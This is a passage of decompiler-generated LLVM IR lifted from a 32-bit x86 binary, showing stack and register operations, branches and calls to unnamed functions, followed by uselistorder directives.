  %v2_8051645 = add i32 %v1_8051645, -4
  %v3_8051645 = inttoptr i32 %v2_8051645 to i32*
  store i32 %v0_8051645, i32* %v3_8051645, align 4
  %v1_8051646 = add i32 %v1_8051645, -8
  %v2_8051646 = inttoptr i32 %v1_8051646 to i32*
  store i32 128, i32* %v2_8051646, align 4
  %v1_805164b = add i32 %v1_8051645, 204
  store i32 %v1_805164b, i32* %edx.global-to-local, align 4
  %v2_8051652 = add i32 %v1_8051645, -12
  %v3_8051652 = inttoptr i32 %v2_8051652 to i32*
  store i32 %v1_805164b, i32* %v3_8051652, align 4
  %v1_8051653 = inttoptr i32 %v1_8051640 to i32*
  %v2_8051653 = load i32, i32* %v1_8051653, align 4
  %v4_8051653 = add i32 %v1_8051645, -16
  %v5_8051653 = inttoptr i32 %v4_8051653 to i32*
  store i32 %v2_8051653, i32* %v5_8051653, align 4
  %v0_8051655 = call i32 @function_8052020()
  store i32 %v0_8051655, i32* %eax.global-to-local, align 4
  %v0_805165a = load i32, i32* @esp, align 4
  %v1_805165a = add i32 %v0_805165a, 16
  %v7_805165a = icmp slt i32 %v1_805165a, 0
  store i1 %v7_805165a, i1* %sf.global-to-local, align 1
  store i32 %v0_8051655, i32* @edi, align 4
  br label %dec_label_pc_80515ee

dec_label_pc_8051661:                             ; preds = %dec_label_pc_80514e2, %dec_label_pc_80514db, %dec_label_pc_80514c8
  %v0_805167e34 = phi i32 [ %v1_8051471, %dec_label_pc_80514e2 ], [ 0, %dec_label_pc_80514db ], [ 5, %dec_label_pc_80514c8 ]
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805167b

dec_label_pc_8051665:                             ; preds = %dec_label_pc_80515e8, %dec_label_pc_805155a
  store i32 6, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805c09e.311 to i32), i32* @edi, align 4
  br label %dec_label_pc_8051676

dec_label_pc_8051676:                             ; preds = %dec_label_pc_8051611, %dec_label_pc_8051608, %dec_label_pc_805159c, %dec_label_pc_8051665
  %v0_8051676 = load i32, i32* @esp, align 4
  %v1_8051676 = add i32 %v0_8051676, 7
  %v2_8051676 = inttoptr i32 %v1_8051676 to i8*
  store i8 32, i8* %v2_8051676, align 1
  %v0_805167e.pre = load i32, i32* @esi, align 4
  %v1_805167e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805167b

dec_label_pc_805167b:                             ; preds = %dec_label_pc_8051661, %dec_label_pc_80514ea, %dec_label_pc_8051676
  %v1_805167e = phi i32 [ 0, %dec_label_pc_8051661 ], [ %v2_80514e2, %dec_label_pc_80514ea ], [ %v1_805167e.pre, %dec_label_pc_8051676 ]
  %v0_805167e = phi i32 [ %v0_805167e34, %dec_label_pc_8051661 ], [ %v1_8051471, %dec_label_pc_80514ea ], [ %v0_805167e.pre, %dec_label_pc_8051676 ]
  %v0_805167b = load i32, i32* @ebp, align 4
  %v1_805167b = add i32 %v0_805167b, -11
  %v9_805167b = icmp eq i32 %v1_805167b, 0
  %v10_805167b = icmp slt i32 %v1_805167b, 0
  store i1 %v10_805167b, i1* %sf.global-to-local, align 1
  %v2_805167e = add i32 %v0_805167e, %v1_805167e
  store i32 %v2_805167e, i32* @edx, align 4
  br i1 %v9_805167b, label %dec_label_pc_805168f, label %dec_label_pc_8051683

dec_label_pc_8051683:                             ; preds = %dec_label_pc_805167b
  %v1_8051685 = add i32 %v0_805167b, -5
  %v6_8051685 = sub i32 4, %v0_805167b
  %v7_8051685 = and i32 %v6_8051685, %v0_805167b
  %v8_8051685 = icmp slt i32 %v7_8051685, 0
  %v9_8051685 = icmp eq i32 %v1_8051685, 0
  %v10_8051685 = icmp slt i32 %v1_8051685, 0
  store i1 %v10_8051685, i1* %sf.global-to-local, align 1
  %v3_8051688 = icmp eq i1 %v10_8051685, %v8_8051685
  %v4_8051688 = icmp eq i1 %v9_8051685, false
  %v5_8051688 = and i1 %v4_8051688, %v3_8051688
  %v6_8051688 = zext i1 %v5_8051688 to i32
  store i32 %v6_8051688, i32* %eax.global-to-local, align 4
  %v2_805168b = add i32 %v2_805167e, 1
  %v3_805168b = add i32 %v2_805168b, %v6_8051688
  store i32 %v3_805168b, i32* @edx, align 4
  br label %dec_label_pc_805168f

dec_label_pc_805168f:                             ; preds = %dec_label_pc_805167b, %dec_label_pc_8051683
  %v0_805168f = load i32, i32* @esp, align 4
  %v1_805168f = add i32 %v0_805168f, 24
  %v2_805168f = inttoptr i32 %v1_805168f to i32*
  %v3_805168f = load i32, i32* %v2_805168f, align 4
  store i32 %v3_805168f, i32* %eax.global-to-local, align 4
  %v1_8051693 = add i32 %v0_805168f, 8
  %v2_8051693 = inttoptr i32 %v1_8051693 to i32*
  store i32 0, i32* %v2_8051693, align 4
  %v0_805169b = load i32, i32* %eax.global-to-local, align 4
  %v1_805169b = load i32, i32* @edx, align 4
  %v2_805169b = sub i32 %v0_805169b, %v1_805169b
  %v7_805169b = icmp ult i32 %v0_805169b, %v1_805169b
  %v12_805169b = icmp eq i32 %v2_805169b, 0
  %v13_805169b = icmp slt i32 %v2_805169b, 0
  store i1 %v13_805169b, i1* %sf.global-to-local, align 1
  %v2_805169d = or i1 %v7_805169b, %v12_805169b
  br i1 %v2_805169d, label %dec_label_pc_80516a5, label %dec_label_pc_805169f

dec_label_pc_805169f:                             ; preds = %dec_label_pc_805168f
  store i1 %v13_805169b, i1* %sf.global-to-local, align 1
  store i32 %v2_805169b, i32* %eax.global-to-local, align 4
  %v1_80516a1 = load i32, i32* @esp, align 4
  %v2_80516a1 = add i32 %v1_80516a1, 8
  %v3_80516a1 = inttoptr i32 %v2_80516a1 to i32*
  store i32 %v2_805169b, i32* %v3_80516a1, align 4
  %v0_80516a9.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80516a5

dec_label_pc_80516a5:                             ; preds = %dec_label_pc_805168f, %dec_label_pc_805169f
  %v0_80516a9 = phi i32 [ %v1_805169b, %dec_label_pc_805168f ], [ %v0_80516a9.pre, %dec_label_pc_805169f ]
  %v0_80516a5 = load i32, i32* @esp, align 4
  %v1_80516a5 = add i32 %v0_80516a5, 8
  %v2_80516a5 = inttoptr i32 %v1_80516a5 to i32*
  %v3_80516a5 = load i32, i32* %v2_80516a5, align 4
  store i32 %v3_80516a5, i32* %ecx.global-to-local, align 4
  %v2_80516a9 = add i32 %v3_80516a5, %v0_80516a9
  store i32 %v2_80516a9, i32* %eax.global-to-local, align 4
  %v1_80516ac = inttoptr i32 %v0_80516a5 to i32*
  %v2_80516ac = load i32, i32* %v1_80516ac, align 4
  %v4_80516ac = add i32 %v2_80516ac, %v2_80516a9
  %v15_80516ac = icmp slt i32 %v4_80516ac, 0
  store i1 %v15_80516ac, i1* %sf.global-to-local, align 1
  store i32 %v4_80516ac, i32* %v1_80516ac, align 4
  %v0_80516af = load i32, i32* @esp, align 4
  %v1_80516af = add i32 %v0_80516af, 7
  %v2_80516af = inttoptr i32 %v1_80516af to i8*
  %v3_80516af = load i8, i8* %v2_80516af, align 1
  %v4_80516af = add i8 %v3_80516af, -48
  %v9_80516af = icmp eq i8 %v4_80516af, 0
  %v10_80516af = icmp slt i8 %v4_80516af, 0
  store i1 %v10_80516af, i1* %sf.global-to-local, align 1
  %v1_80516b4 = icmp eq i1 %v9_80516af, false
  br i1 %v1_80516b4, label %dec_label_pc_80516c0, label %dec_label_pc_80516b6

dec_label_pc_80516b6:                             ; preds = %dec_label_pc_80516a5
  %v0_80516b6 = load i32, i32* @ebx, align 4
  %v1_80516b6 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80516b6 = add i32 %v1_80516b6, %v0_80516b6
  %v13_80516b6 = icmp slt i32 %v2_80516b6, 0
  store i1 %v13_80516b6, i1* %sf.global-to-local, align 1
  store i32 %v2_80516b6, i32* @ebx, align 4
  %v1_80516b8 = add i32 %v0_80516af, 8
  %v2_80516b8 = inttoptr i32 %v1_80516b8 to i32*
  store i32 0, i32* %v2_80516b8, align 4
  %v0_80516c0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80516c0

dec_label_pc_80516c0:                             ; preds = %dec_label_pc_80516a5, %dec_label_pc_80516b6
  %v0_80516c7 = phi i32 [ %v0_80516af, %dec_label_pc_80516a5 ], [ %v0_80516c0.pre, %dec_label_pc_80516b6 ]
  %v1_80516c0 = add i32 %v0_80516c7, 32
  %v2_80516c0 = inttoptr i32 %v1_80516c0 to i8*
  %v3_80516c0 = load i8, i8* %v2_80516c0, align 1
  %v4_80516c0 = and i8 %v3_80516c0, 8
  %v5_80516c0 = icmp eq i8 %v4_80516c0, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_80516c5 = icmp eq i1 %v5_80516c0, false
  br i1 %v1_80516c5, label %dec_label_pc_80516ee, label %dec_label_pc_80516c7

dec_label_pc_80516c7:                             ; preds = %dec_label_pc_80516c0
  %v1_80516c7 = add i32 %v0_80516c7, 8
  %v2_80516c7 = inttoptr i32 %v1_80516c7 to i32*
  %v3_80516c7 = load i32, i32* %v2_80516c7, align 4
  store i32 %v3_80516c7, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_80516d0 = add i32 %v0_80516c7, 368
  %v2_80516d0 = inttoptr i32 %v1_80516d0 to i32*
  %v3_80516d0 = load i32, i32* %v2_80516d0, align 4
  store i32 %v3_80516d0, i32* @eax, align 4
  %v0_80516d7 = call i32 @function_8051198()
  store i32 %v0_80516d7, i32* %eax.global-to-local, align 4
  %v1_80516dc = load i32, i32* @esp, align 4
  %v2_80516dc = add i32 %v1_80516dc, 8
  %v3_80516dc = inttoptr i32 %v2_80516dc to i32*
  %v4_80516dc = load i32, i32* %v3_80516dc, align 4
  %v5_80516dc = sub i32 %v0_80516d7, %v4_80516dc
  %v15_80516dc = icmp eq i32 %v5_80516dc, 0
  %v16_80516dc = icmp slt i32 %v5_80516dc, 0
  store i1 %v16_80516dc, i1* %sf.global-to-local, align 1
  %v1_80516e0 = icmp eq i1 %v15_80516dc, false
  br i1 %v1_80516e0, label %dec_label_pc_80517db, label %dec_label_pc_80516e6

dec_label_pc_80516e6:                             ; preds = %dec_label_pc_80516c7
  store i32 0, i32* %v3_80516dc, align 4
  %v1_80516ee.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80516ee

dec_label_pc_80516ee:                             ; preds = %dec_label_pc_80516c0, %dec_label_pc_80516e6
  %v1_80516ee = phi i32 [ %v0_80516c7, %dec_label_pc_80516c0 ], [ %v1_80516ee.pre, %dec_label_pc_80516e6 ]
  %v0_80516ee = load i32, i32* %eax.global-to-local, align 4
  %v2_80516ee = add i32 %v1_80516ee, -4
  %v3_80516ee = inttoptr i32 %v2_80516ee to i32*
  store i32 %v0_80516ee, i32* %v3_80516ee, align 4
  %v0_80516ef = load i32, i32* %eax.global-to-local, align 4
  %v2_80516ef = add i32 %v1_80516ee, -8
  %v3_80516ef = inttoptr i32 %v2_80516ef to i32*
  store i32 %v0_80516ef, i32* %v3_80516ef, align 4
  %v1_80516f0 = add i32 %v1_80516ee, 368
  %v2_80516f0 = inttoptr i32 %v1_80516f0 to i32*
  %v3_80516f0 = load i32, i32* %v2_80516f0, align 4
  %v5_80516f0 = add i32 %v1_80516ee, -12
  %v6_80516f0 = inttoptr i32 %v5_80516f0 to i32*
  store i32 %v3_80516f0, i32* %v6_80516f0, align 4
  %v0_80516f7 = load i32, i32* @ebp, align 4
  %v1_80516f7 = add i32 %v0_80516f7, ptrtoint (i32* @global_var_805c0a5.312 to i32)
  store i32 %v1_80516f7, i32* %eax.global-to-local, align 4
  %v2_80516fd = add i32 %v1_80516ee, -16
  %v3_80516fd = inttoptr i32 %v2_80516fd to i32*
  store i32 %v1_80516f7, i32* %v3_80516fd, align 4
  %v0_80516fe = call i32 @function_8051db0()
  store i32 %v0_80516fe, i32* %eax.global-to-local, align 4
  %v0_8051703 = load i32, i32* @esp, align 4
  %v1_8051703 = add i32 %v0_8051703, 384
  %v2_8051703 = inttoptr i32 %v1_8051703 to i32*
  %v3_8051703 = load i32, i32* %v2_8051703, align 4
  store i32 %v3_8051703, i32* @eax, align 4
  %v0_805170a = load i32, i32* @ebx, align 4
  store i32 %v0_805170a, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_8051711 = call i32 @function_8051198()
  store i32 %v0_8051711, i32* %eax.global-to-local, align 4
  %v0_8051716 = load i32, i32* @esp, align 4
  %v1_8051716 = add i32 %v0_8051716, 16
  %v1_8051719 = load i32, i32* @ebx, align 4
  %v2_8051719 = sub i32 %v0_8051711, %v1_8051719
  %v12_8051719 = icmp eq i32 %v2_8051719, 0
  %v13_8051719 = icmp slt i32 %v2_8051719, 0
  store i1 %v13_8051719, i1* %sf.global-to-local, align 1
  %v1_805171b = icmp eq i1 %v12_8051719, false
  br i1 %v1_805171b, label %dec_label_pc_80517db, label %dec_label_pc_8051721

dec_label_pc_8051721:                             ; preds = %dec_label_pc_80516ee
  %v1_8051721 = add i32 %v0_8051716, 356
  %v2_8051721 = inttoptr i32 %v1_8051721 to i32*
  %v3_8051721 = load i32, i32* %v2_8051721, align 4
  %v4_8051721 = icmp eq i32 %v3_8051721, 0
  %v5_8051721 = icmp slt i32 %v3_8051721, 0
  store i1 %v5_8051721, i1* %sf.global-to-local, align 1
  %v1_8051729 = icmp eq i1 %v4_8051721, false
  br i1 %v1_8051729, label %dec_label_pc_805174d, label %dec_label_pc_805172b

dec_label_pc_805172b:                             ; preds = %dec_label_pc_8051721
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805172d = load i32, i32* @esi, align 4
  %v1_805172d = icmp eq i32 %v0_805172d, 0
  %v2_805172d = icmp slt i32 %v0_805172d, 0
  store i1 %v2_805172d, i1* %sf.global-to-local, align 1
  br i1 %v1_805172d, label %dec_label_pc_8051743, label %dec_label_pc_8051731

dec_label_pc_8051731:                             ; preds = %dec_label_pc_805172b
  %v2_8051731 = add i32 %v0_8051716, 12
  %v3_8051731 = inttoptr i32 %v2_8051731 to i32*
  store i32 0, i32* %v3_8051731, align 4
  %v1_8051732 = add i32 %v0_8051716, 384
  %v2_8051732 = inttoptr i32 %v1_8051732 to i32*
  %v3_8051732 = load i32, i32* %v2_8051732, align 4
  %v5_8051732 = add i32 %v0_8051716, 8
  %v6_8051732 = inttoptr i32 %v5_8051732 to i32*
  store i32 %v3_8051732, i32* %v6_8051732, align 4
  %v0_8051739 = load i32, i32* @esi, align 4
  %v2_8051739 = add i32 %v0_8051716, 4
  %v3_8051739 = inttoptr i32 %v2_8051739 to i32*
  store i32 %v0_8051739, i32* %v3_8051739, align 4
  %v0_805173a = load i32, i32* @edi, align 4
  %v3_805173a = inttoptr i32 %v0_8051716 to i32*
  store i32 %v0_805173a, i32* %v3_805173a, align 4
  %v0_805173b = load i32, i32* %stack_var_-364, align 4
  %v4_805173b = call i32 @function_80547a0(i32 %v0_805173b, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805173b, i32* %eax.global-to-local, align 4
  %v0_8051740 = load i32, i32* @esp, align 4
  %v1_8051740 = add i32 %v0_8051740, 16
  %v7_8051740 = icmp slt i32 %v1_8051740, 0
  store i1 %v7_8051740, i1* %sf.global-to-local, align 1
  %v1_8051743.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051743

dec_label_pc_8051743:                             ; preds = %dec_label_pc_805172b, %dec_label_pc_8051731
  %v0_80517ad46 = phi i32 [ %v1_8051716, %dec_label_pc_805172b ], [ %v1_8051740, %dec_label_pc_8051731 ]
  %v1_8051743 = phi i32 [ 0, %dec_label_pc_805172b ], [ %v1_8051743.pre, %dec_label_pc_8051731 ]
  %v0_8051743 = phi i32 [ 0, %dec_label_pc_805172b ], [ %v4_805173b, %dec_label_pc_8051731 ]
  %v2_8051743 = sub i32 %v0_8051743, %v1_8051743
  %v12_8051743 = icmp eq i32 %v2_8051743, 0
  %v13_8051743 = icmp slt i32 %v2_8051743, 0
  store i1 %v13_8051743, i1* %sf.global-to-local, align 1
  %v1_8051745 = icmp eq i1 %v12_8051743, false
  br i1 %v1_8051745, label %dec_label_pc_80517db, label %dec_label_pc_80517ad

dec_label_pc_805174d:                             ; preds = %dec_label_pc_8051721
  %v1_805174d = add i32 %v0_8051716, 348
  %v2_805174d = inttoptr i32 %v1_805174d to i32*
  store i32 0, i32* %v2_805174d, align 4
  %v0_80517a98 = load i32, i32* @esi, align 4
  %v1_80517a99 = icmp eq i32 %v0_80517a98, 0
  %v2_80517a910 = icmp slt i32 %v0_80517a98, 0
  store i1 %v2_80517a910, i1* %sf.global-to-local, align 1
  %v1_80517ab16 = icmp eq i1 %v1_80517a99, false
  %v0_805175a.pre = load i32, i32* @esp, align 4
  br i1 %v1_80517ab16, label %dec_label_pc_805175a, label %dec_label_pc_80517ad

dec_label_pc_805175a:                             ; preds = %dec_label_pc_805174d, %dec_label_pc_80517a7
  %v0_8051761 = phi i32 [ %v2_80517a7, %dec_label_pc_80517a7 ], [ %v0_80517a98, %dec_label_pc_805174d ]
  %v1_805176c = phi i32 [ %v0_805175a41, %dec_label_pc_80517a7 ], [ %v0_805175a.pre, %dec_label_pc_805174d ]
  %v1_805175a = add i32 %v1_805176c, 332
  store i32 %v1_805175a, i32* %edx.global-to-local, align 4
  %v1_8051761 = add i32 %v0_8051761, -128
  %v2_8051761 = icmp ult i32 %v0_8051761, 128
  %v6_8051761 = icmp eq i32 %v1_8051761, 0
  %v7_8051761 = icmp slt i32 %v1_8051761, 0
  store i1 %v7_8051761, i1* %sf.global-to-local, align 1
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_805176c = add i32 %v1_805176c, -4
  %v3_805176c = inttoptr i32 %v2_805176c to i32*
  store i32 %v1_805175a, i32* %v3_805176c, align 4
  %v2_805176d = or i1 %v2_8051761, %v6_8051761
  %v3_805176d = load i32, i32* %eax.global-to-local, align 4
  %v4_805176d = load i32, i32* @esi, align 4
  %v5_805176d = select i1 %v2_805176d, i32 %v4_805176d, i32 %v3_805176d
  %v2_8051770 = add i32 %v1_805176c, -8
  %v3_8051770 = inttoptr i32 %v2_8051770 to i32*
  store i32 %v5_805176d, i32* %v3_8051770, align 4
  %v1_8051771 = add i32 %v1_805176c, 340
  store i32 %v1_8051771, i32* %eax.global-to-local, align 4
  %v2_8051778 = add i32 %v1_805176c, -12
  %v3_8051778 = inttoptr i32 %v2_8051778 to i32*
  store i32 %v1_8051771, i32* %v3_8051778, align 4
  %v1_8051779 = add i32 %v1_805176c, 204
  store i32 %v1_8051779, i32* @edi, align 4
  %v2_8051780 = add i32 %v1_805176c, -16
  %v3_8051780 = inttoptr i32 %v2_8051780 to i32*
  store i32 %v1_8051779, i32* %v3_8051780, align 4
  %v0_8051781 = call i32 @function_8054658()
  %v0_8051786 = load i32, i32* @esp, align 4
  %v1_8051786 = add i32 %v0_8051786, 16
  store i32 %v0_8051781, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805178d = icmp eq i32 %v0_8051781, 0
  %v2_805178d = icmp slt i32 %v0_8051781, 0
  store i1 %v2_805178d, i1* %sf.global-to-local, align 1
  br i1 %v1_805178d, label %dec_label_pc_80517a3, label %dec_label_pc_8051791

dec_label_pc_8051791:                             ; preds = %dec_label_pc_805175a
  %v0_8051791 = load i32, i32* @ebp, align 4
  %v2_8051791 = add i32 %v0_8051786, 12
  %v3_8051791 = inttoptr i32 %v2_8051791 to i32*
  store i32 %v0_8051791, i32* %v3_8051791, align 4
  %v1_8051792 = add i32 %v0_8051786, 384
  %v2_8051792 = inttoptr i32 %v1_8051792 to i32*
  %v3_8051792 = load i32, i32* %v2_8051792, align 4
  %v5_8051792 = add i32 %v0_8051786, 8
  %v6_8051792 = inttoptr i32 %v5_8051792 to i32*
  store i32 %v3_8051792, i32* %v6_8051792, align 4
  %v2_8051799 = add i32 %v0_8051786, 4
  %v3_8051799 = inttoptr i32 %v2_8051799 to i32*
  store i32 %v0_8051781, i32* %v3_8051799, align 4
  %v0_805179a = load i32, i32* @edi, align 4
  %v3_805179a = inttoptr i32 %v0_8051786 to i32*
  store i32 %v0_805179a, i32* %v3_805179a, align 4
  %v0_805179b = load i32, i32* %stack_var_-364, align 4
  %v4_805179b = call i32 @function_80547a0(i32 %v0_805179b, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805179b, i32* %eax.global-to-local, align 4
  %v0_80517a0 = load i32, i32* @esp, align 4
  %v1_80517a0 = add i32 %v0_80517a0, 16
  %v7_80517a0 = icmp slt i32 %v1_80517a0, 0
  store i1 %v7_80517a0, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_80517a3

dec_label_pc_80517a3:                             ; preds = %dec_label_pc_805175a, %dec_label_pc_8051791
  %v1_80517a7 = phi i32 [ 0, %dec_label_pc_805175a ], [ %v4_805179b, %dec_label_pc_8051791 ]
  %v0_805175a41 = phi i32 [ %v1_8051786, %dec_label_pc_805175a ], [ %v1_80517a0, %dec_label_pc_8051791 ]
  %v2_80517a3 = sub i32 %v1_80517a7, %v0_8051781
  %v12_80517a3 = icmp eq i32 %v2_80517a3, 0
  %v13_80517a3 = icmp slt i32 %v2_80517a3, 0
  store i1 %v13_80517a3, i1* %sf.global-to-local, align 1
  %v1_80517a5 = icmp eq i1 %v12_80517a3, false
  br i1 %v1_80517a5, label %dec_label_pc_80517db, label %dec_label_pc_80517a7

dec_label_pc_80517a7:                             ; preds = %dec_label_pc_80517a3
  %v0_80517a7 = load i32, i32* @esi, align 4
  %v2_80517a7 = sub i32 %v0_80517a7, %v1_80517a7
  %v12_80517a7 = icmp eq i32 %v2_80517a7, 0
  %v13_80517a7 = icmp slt i32 %v2_80517a7, 0
  store i32 %v2_80517a7, i32* @esi, align 4
  store i1 %v13_80517a7, i1* %sf.global-to-local, align 1
  %v1_80517ab = icmp eq i1 %v12_80517a7, false
  br i1 %v1_80517ab, label %dec_label_pc_805175a, label %dec_label_pc_80517ad

dec_label_pc_80517ad:                             ; preds = %dec_label_pc_80517a7, %dec_label_pc_805174d, %dec_label_pc_8051743
  %v0_80517ad = phi i32 [ %v0_80517ad46, %dec_label_pc_8051743 ], [ %v0_805175a.pre, %dec_label_pc_805174d ], [ %v0_805175a41, %dec_label_pc_80517a7 ]
  %v1_80517ad = add i32 %v0_80517ad, 8
  %v2_80517ad = inttoptr i32 %v1_80517ad to i32*
  %v3_80517ad = load i32, i32* %v2_80517ad, align 4
  store i32 %v3_80517ad, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_80517b6 = add i32 %v0_80517ad, 368
  %v2_80517b6 = inttoptr i32 %v1_80517b6 to i32*
  %v3_80517b6 = load i32, i32* %v2_80517b6, align 4
  store i32 %v3_80517b6, i32* @eax, align 4
  %v0_80517bd = call i32 @function_8051198()
  store i32 %v0_80517bd, i32* %eax.global-to-local, align 4
  %v1_80517c2 = load i32, i32* @esp, align 4
  %v2_80517c2 = add i32 %v1_80517c2, 8
  %v3_80517c2 = inttoptr i32 %v2_80517c2 to i32*
  %v4_80517c2 = load i32, i32* %v3_80517c2, align 4
  %v5_80517c2 = sub i32 %v0_80517bd, %v4_80517c2
  %v15_80517c2 = icmp eq i32 %v5_80517c2, 0
  %v16_80517c2 = icmp slt i32 %v5_80517c2, 0
  store i1 %v16_80517c2, i1* %sf.global-to-local, align 1
  %v1_80517c6 = icmp eq i1 %v15_80517c2, false
  br i1 %v1_80517c6, label %dec_label_pc_80517db, label %dec_label_pc_80517c8

dec_label_pc_80517c8:                             ; preds = %dec_label_pc_80517ad, %dec_label_pc_8051535, %dec_label_pc_8051360
  %v0_80517c8 = phi i32 [ %v1_80517c2, %dec_label_pc_80517ad ], [ %v0_80517c8.pre, %dec_label_pc_8051535 ], [ %v1_805137e, %dec_label_pc_8051360 ]
  %v1_80517c8 = add i32 %v0_80517c8, 16
  %v2_80517c8 = inttoptr i32 %v1_80517c8 to i32*
  %v3_80517c8 = load i32, i32* %v2_80517c8, align 4
  store i32 %v3_80517c8, i32* @ebx, align 4
  store i32 %v3_80517c8, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80512b8.backedge

dec_label_pc_80517d3:                             ; preds = %dec_label_pc_80512f6
  %v1_80517d3 = add i32 %v0_80517d3, 2
  %v10_80517d3 = icmp slt i32 %v1_80517d3, 0
  store i1 %v10_80517d3, i1* %sf.global-to-local, align 1
  store i32 %v1_80517d3, i32* @ebx, align 4
  br label %dec_label_pc_80512b8.backedge

dec_label_pc_80517db:                             ; preds = %dec_label_pc_80512e2, %dec_label_pc_80517ad, %dec_label_pc_8051743, %dec_label_pc_80516ee, %dec_label_pc_80516c7, %dec_label_pc_8051637, %dec_label_pc_80515aa, %dec_label_pc_805156b, %dec_label_pc_805150c, %dec_label_pc_80517a3
  %v0_80517db = phi i32 [ %v0_805175a41, %dec_label_pc_80517a3 ], [ %v0_80517db.pre.pre, %dec_label_pc_80512e2 ], [ %v1_80517c2, %dec_label_pc_80517ad ], [ %v0_80517ad46, %dec_label_pc_8051743 ], [ %v1_8051716, %dec_label_pc_80516ee ], [ %v1_80516dc, %dec_label_pc_80516c7 ], [ %v0_8051358.lcssa, %dec_label_pc_8051637 ], [ %v1_80515c2, %dec_label_pc_80515aa ], [ %v1_805158e, %dec_label_pc_805156b ], [ %v1_805152a, %dec_label_pc_805150c ]
  %v1_80517db = inttoptr i32 %v0_80517db to i32*
  store i32 -1, i32* %v1_80517db, align 4
  br label %dec_label_pc_80517e2

dec_label_pc_80517e2:                             ; preds = %dec_label_pc_80512ed, %dec_label_pc_805125b, %dec_label_pc_805127a, %dec_label_pc_80517db
  %v0_80517e2 = load i32, i32* @esp, align 4
  %v1_80517e2 = inttoptr i32 %v0_80517e2 to i32*
  %v2_80517e2 = load i32, i32* %v1_80517e2, align 4
  store i32 %v2_80517e2, i32* %eax.global-to-local, align 4
  %v1_80517e5 = add i32 %v0_80517e2, 348
  %v10_80517e5 = icmp slt i32 %v1_80517e5, 0
  store i1 %v10_80517e5, i1* %sf.global-to-local, align 1
  ret i32 %v2_80517e2

; uselistorder directives
  uselistorder i32 %v1_80517d3, { 1, 2, 0 }
  uselistorder i32 %v3_80517c8, { 2, 3, 0, 1 }
  uselistorder i32 %v0_80517ad, { 1, 0 }
  uselistorder i32 %v2_80517a7, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8051786, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8051781, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_8051761, { 1, 0 }
  uselistorder i32 %v0_805175a.pre, { 1, 0 }
  uselistorder i32 %v0_805172d, { 1, 0 }
  uselistorder i32 %v3_8051721, { 1, 0 }
  uselistorder i32 %v0_8051716, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_80516ee, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_80516c7, { 0, 2, 1, 3 }
  uselistorder i8 %v4_80516af, { 1, 0 }
  uselistorder i32 %v2_805169b, { 1, 0, 2, 3 }
  uselistorder i32 %v6_8051688, { 1, 0 }
  uselistorder i32 %v1_8051685, { 1, 0 }
  uselistorder i32 %v1_805167b, { 1, 0 }
  uselistorder i32 %v0_805167b, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805165a, { 1, 0 }
  uselistorder i32 %v1_8051637, { 1, 0 }
  uselistorder i32 %v1_80515f5, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8051611, { 3, 2, 1, 0 }
  uselistorder i32 %v1_80515da, { 1, 0 }
  uselistorder i32 %v1_80515c5, { 1, 0 }
  uselistorder i32 %v1_8051591, { 1, 0 }
  uselistorder i32 %v0_805156b, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_8051551, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v1_805153d, { 1, 0 }
  uselistorder i32 %v1_80514f3, { 1, 0 }
  uselistorder i32 %v4_80514c1, { 1, 0 }
  uselistorder i32 %v0_80514b6, { 1, 0, 2, 3 }
  uselistorder i8 %v3_80514b1, { 1, 0 }
  uselistorder i32 %v0_80514ea, { 1, 0, 2, 3 }
  uselistorder i8 %v3_80514a1, { 1, 0 }
  uselistorder i32 %v1_8051498, { 1, 0 }
  uselistorder i32 %v1_805148c, { 1, 0 }
  uselistorder i32 %v3_8051480, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8051476, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_8051471, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_805146f, { 1, 0 }
  uselistorder i32 %v0_80514c1, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_80514b1, { 1, 2, 0 }
  uselistorder i32 %v3_8051449, { 0, 1, 3, 2 }
  uselistorder i8 %v4_8051437, { 1, 0 }
  uselistorder i32 %v4_805142e, { 1, 0 }
  uselistorder i32 %v3_805142e, { 1, 0 }
  uselistorder i32 %v6_8051426, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 %v0_80513f7, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v1_80513f6, { 2, 1, 0 }
  uselistorder i32 %v1_80513cf, { 1, 0 }
  uselistorder i32 %v1_80513c3, { 1, 0 }
  uselistorder i32 %v1_80513be, { 1, 0 }
  uselistorder i32 %v2_80513b6, { 1, 0 }
  uselistorder i32 %tmp67, { 1, 0 }
